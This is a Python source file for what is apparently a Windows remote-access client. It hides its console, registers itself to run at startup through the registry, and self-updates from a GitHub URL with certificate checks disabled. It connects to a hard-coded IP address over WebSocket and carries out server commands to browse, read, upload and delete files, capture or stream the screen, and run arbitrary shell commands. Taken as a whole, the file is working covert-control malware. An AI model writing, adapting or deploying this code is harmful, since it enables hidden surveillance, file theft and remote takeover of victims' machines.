# 1.2

import subprocess
import importlib
import sys

requiredModules = {
    "websocket": "websocket-client",
    "win32con": "pywin32",
    "PIL": "pillow",
    "requests": "requests",
    "urllib3": "urllib3"
}

def installMissingModules(modules):
    installedSomething = False
    for importName, pipName in modules.items():
        try:
            importlib.import_module(importName)
        except ImportError:
            subprocess.check_call([sys.executable, "-m", "pip", "install", pipName])
            installedSomething = True
    if installedSomething:
        subprocess.check_call([sys.executable] + sys.argv)
        sys.exit()

installMissingModules(requiredModules)

import websocket
import json
import os
import mimetypes
import winreg
import base64
import win32gui
import win32con
from PIL import ImageGrab
import io
import base64
import stat

# Hide console
win = win32gui.GetForegroundWindow()
win32gui.ShowWindow(win, win32con.SW_HIDE)

serverWs = "ws://101.185.230.137:5015/ws"
baseDir = "C:\\"
currentDir = baseDir

import requests
import time
import re
import urllib3
from urllib3.exceptions import InsecureRequestWarning
urllib3.disable_warnings(InsecureRequestWarning)

def checkForUpdate(force: int):
    localFile = os.path.abspath(__file__)
    repoUrl = "https://raw.githubusercontent.com/ryder7223/Random/refs/heads/main/shareFilesystem/client.py"
    print("Checking for updates...")
    time.sleep(1)

    # Read local version
    try:
        with open(localFile, "r", encoding="utf-8") as f:
            firstLine = f.readline().strip()
            localVersionMatch = re.match(r"#\s*([\d.]+)", firstLine)
            if not localVersionMatch:
                print("Unable to read local version number.")
                time.sleep(1)
                return
            localVersion = localVersionMatch.group(1)
    except Exception as e:
        print(f"Error reading local version: {e}")
        time.sleep(1)
        return

    # Get version from GitHub
    try:
        response = requests.get(repoUrl, timeout=10, verify=False)
        if response.status_code != 200:
            print(f"Failed to fetch version (HTTP {response.status_code}).")
            time.sleep(1)
            return
        remoteText = response.text
        remoteFirstLine = remoteText.splitlines()[0].strip()
        remoteVersionMatch = re.match(r"#\s*([\d.]+)", remoteFirstLine)
        if not remoteVersionMatch:
            print("Unable to read version number.")
            time.sleep(1)
            return
        remoteVersion = remoteVersionMatch.group(1)
    except Exception:
        print(f"Unable to fetch newest version, proceeding offline.")
        time.sleep(1)
        return

    # Compare versions
    def versionTuple(v: str): 
        return tuple(map(int, v.split('.')))

    updateNeeded = False
    if force == 1:
        print("Updating...")
        updateNeeded = True
    elif versionTuple(remoteVersion) > versionTuple(localVersion):
        print(f"New version available ({localVersion} → {remoteVersion}). Updating...")
        updateNeeded = True
    else:
        print(f"Version {localVersion} is up to date.")
        time.sleep(1)

    if updateNeeded:
        time.sleep(1)
        try:
            normalizedText = re.sub(r'\n{3,}', '\n\n', remoteText.replace('\r\n', '\n'))
            with open(localFile, "w", encoding="utf-8") as f:
                f.write(normalizedText)
            print("Update complete. Restarting...")
            time.sleep(1)
        except Exception as e:
            print(f"Failed to write updated file: {e}")
            time.sleep(1)
            return

        # Restart script
        subprocess.check_call([sys.executable] + sys.argv)
        sys.exit()


checkForUpdate(force=0)

# -----------------------------
# Startup registration
# -----------------------------
def addToStartup(scriptPath=None):
    if scriptPath is None:
        scriptPath = os.path.abspath(sys.argv[0])
    pythonPath = sys.executable
    key = winreg.OpenKey(
        winreg.HKEY_CURRENT_USER,
        r"Software\Microsoft\Windows\CurrentVersion\Run",
        0,
        winreg.KEY_SET_VALUE
    )
    winreg.SetValueEx(key, "PythonClient", 0, winreg.REG_SZ, f'"{pythonPath}" "{scriptPath}"')
    winreg.CloseKey(key)

addToStartup()

def handleScreenshot():
    try:
        img = ImageGrab.grab()
        buf = io.BytesIO()
        img.save(buf, format="PNG")
        data = base64.b64encode(buf.getvalue()).decode()
        return {"type": "screenshot", "data": data}
    except Exception as e:
        return {"error": str(e)}

# -----------------------------
# Machine GUID
# -----------------------------
def getMachineGuid():
    try:
        key = winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            r"SOFTWARE\\Microsoft\\Cryptography",
            0,
            winreg.KEY_READ
        )
        value, _ = winreg.QueryValueEx(key, "MachineGuid")
        return value
    except:
        return "unknown-client"

clientId = getMachineGuid()

# -----------------------------
# Path helpers
# -----------------------------
def safeJoin(base, path):
    finalPath = os.path.abspath(os.path.join(base, path))
    base = os.path.abspath(base)

    if not finalPath.lower().startswith(base.lower()):
        return None

    return finalPath

# -----------------------------
# File operations
# -----------------------------
def handleBrowse(path):
    if not path:
        absPath = baseDir
    else:
        absPath = safeJoin(baseDir, path)

    if not absPath or not os.path.exists(absPath):
        return {"error": "not found"}

    if os.path.isfile(absPath):
        return {"type": "file", "size": os.path.getsize(absPath)}
    items = []
    for entry in os.listdir(absPath):
        full = os.path.join(absPath, entry)
    
        try:
            st = os.lstat(full)
    
            # Skip reparse points (junctions, symlinks, etc.)
            if stat.S_ISLNK(st.st_mode) or getattr(st, "st_file_attributes", 0) & 0x400:
                continue
    
            items.append({
                "name": entry,
                "isDir": os.path.isdir(full),
                "size": os.path.getsize(full) if os.path.isfile(full) else None
            })
    
        except Exception:
            continue

    return {"type": "dir", "items": items}

def handleFile(path):
    absPath = safeJoin(baseDir, path)
    if not absPath or not os.path.isfile(absPath):
        return {"error": "not found"}
    with open(absPath, "rb") as f:
        data = f.read()
    return {"type": "file", "data": data.hex(), "contentType": mimetypes.guess_type(absPath)[0] or "application/octet-stream"}

def handleUpload(path, dataHex, filename):
    absDir = safeJoin(baseDir, path)
    if not absDir or not os.path.isdir(absDir):
        return {"error": "invalid folder"}
    absPath = os.path.join(absDir, filename)
    with open(absPath, "wb") as f:
        f.write(bytes.fromhex(dataHex))
    return {"status": "ok"}

def handleDelete(path):
    absPath = safeJoin(baseDir, path)
    if not absPath or not os.path.exists(absPath):
        return {"error": "not found"}
    if os.path.isfile(absPath):
        os.remove(absPath)
    else:
        import shutil
        shutil.rmtree(absPath)
    return {"status": "deleted"}

def handleStream():
    try:
        img = ImageGrab.grab()
        #img = img.resize((800, 450))
        
        buf = io.BytesIO()
        img.save(buf, format="JPEG", quality=50)

        data = base64.b64encode(buf.getvalue()).decode()
        return {"type": "stream", "data": data}
    except Exception as e:
        return {"error": str(e)}

def handleRunCommand(command, asyncRun=True):
    try:
        if asyncRun:
            # Fire-and-forget
            subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL,
                creationflags=subprocess.CREATE_NEW_CONSOLE
            )
            return {"type": "command", "output": "Command launched asynchronously"}
        else:
            # Synchronously run command and capture output safely
            try:
                result = subprocess.check_output(
                    command,
                    shell=True,
                    stderr=subprocess.STDOUT,
                    text=True
                )
                return {"type": "command", "output": result}
            except subprocess.CalledProcessError as e:
                # Command failed: return its output without crashing
                return {"type": "command", "output": f"Command failed (exit {e.returncode}):\n{e.output}"}
            except Exception as e:
                # Any other exception
                return {"type": "command", "output": f"Error running command: {str(e)}"}
    except Exception as e:
        # Ensure client never crashes
        return {"type": "command", "output": f"Unexpected error: {str(e)}"}

# -----------------------------
# WebSocket handlers
# -----------------------------
def onMessage(ws, message):
    msg = json.loads(message)
    requestId = msg.get("requestId")
    msgType = msg.get("type")
    path = msg.get("path", "")
    data = msg.get("data", "")
    command = msg.get("command", "")
    filename = msg.get("filename", "")

    if msgType == "browse":
        result = handleBrowse(path)
    elif msgType == "file":
        result = handleFile(path)
    elif msgType == "upload":
        result = handleUpload(path, data, filename)
    elif msgType == "delete":
        result = handleDelete(path)
    elif msgType == "command":
        asyncRun = msg.get("async", True)
        result = handleRunCommand(command, asyncRun)
    elif msgType == "screenshot":
        result = handleScreenshot()
    elif msgType == "stream":
        result = handleStream()
    else:
        result = {"error": "unknown"}

    result["requestId"] = requestId
    ws.send(json.dumps(result))

def onOpen(ws):
    creds = base64.b64encode(b"user:pass").decode()
    ws.send(json.dumps({"id": clientId, "auth": f"Basic {creds}"}))

# -----------------------------
# Run WebSocket forever
# -----------------------------
ws = websocket.WebSocketApp(serverWs, on_message=onMessage, on_open=onOpen)
ws.run_forever()
